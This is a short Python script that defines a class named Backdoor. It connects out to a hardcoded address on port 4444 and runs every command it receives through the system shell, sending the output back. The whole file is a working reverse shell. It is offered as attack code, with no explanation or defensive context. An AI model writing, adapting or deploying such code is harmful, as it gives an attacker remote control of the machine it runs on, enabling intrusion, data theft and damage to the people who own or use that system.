import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b"[+] Connection Successful\n\n")

    def run_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024).decode("UTF-8")
            command_result = self.run_system_commands(command)
            self.connection.send(command_result)

        self.connection.close()

my_backdoor = Backdoor("192.168.1.7", 4444)
my_backdoor.run()